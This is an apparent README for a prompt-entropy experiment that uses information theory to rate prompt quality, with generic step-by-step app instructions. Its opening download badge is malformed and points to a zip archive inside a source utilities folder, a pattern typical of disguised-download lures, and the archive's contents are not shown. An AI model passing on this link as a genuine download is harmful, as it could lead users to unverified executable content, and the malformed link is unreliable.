![Download from GitHub](https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip%20from%20GitHub-v1.0-blue)

## 📜 Description

This project helps you understand how well prompts work in language models. It uses methods from information theory to analyze 1,800 language model generations. By looking at concepts like entropy and mutual information, you can quantify the quality of prompts, making your prompt engineering efforts more effective.

## 📊 How to Use the Application

Once you have the application running, you are ready to begin your analysis.

### 🖱️ Step-by-Step Usage:

1. **Input Your Prompts:** Start by entering the prompts you’d like to analyze in the input box. You can enter multiple prompts, each separated by a line.

2. **Select Your Metrics:** Choose the metrics you’d like to evaluate. You can opt for entropy, mutual information, or both. Each metric measures different aspects of prompt quality.

3. **Run the Analysis:** Press the "Analyze" button. The application will process your prompts and provide results in a readable format.

4. **Review the Results:** After analysis, the application will display a summary. This includes graphs and key metrics that visualize your prompt's quality.

5. **Export Your Findings:** If you wish to keep a record of your results, use the export feature to save the analysis as a CSV or PDF file.
